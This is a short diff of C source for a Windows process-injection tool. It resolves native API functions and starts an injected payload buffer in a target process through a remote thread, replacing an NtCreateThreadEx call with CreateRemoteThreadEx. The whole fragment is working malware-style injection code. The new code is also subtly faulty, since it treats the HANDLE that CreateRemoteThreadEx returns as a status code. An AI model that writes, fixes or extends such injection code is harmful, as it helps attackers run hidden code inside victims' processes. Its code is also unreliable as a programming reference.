@@ -73,7 +73,6 @@ int main(int argc, char* argv[]) {
 
 	info("populating function prototypes...");
 	NtOpenProcess heckingOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
-	NtCreateThreadEx heckingThread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
 	NtClose heckingClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
 	okay("finished, beginning injection!");
 
@@ -108,9 +107,9 @@ int main(int argc, char* argv[]) {
 
 /* creating thread to execute the payload... */
 
-	STATUS = heckingThread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
+	STATUS = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &hThread);
 	if (STATUS != STATUS_SUCCESS) {
-		warn("[NtCreateThreadEx] failed to get a handle on the thread, error: 0x%lx", STATUS);
+		warn("[CreateRemoteThreadEx] failed to get a handle on the thread, error: 0x%lx", STATUS);
 		goto CLEANUP;
 	}
 	okay("thread created, started routine! waiting fo thread to finish execution...");
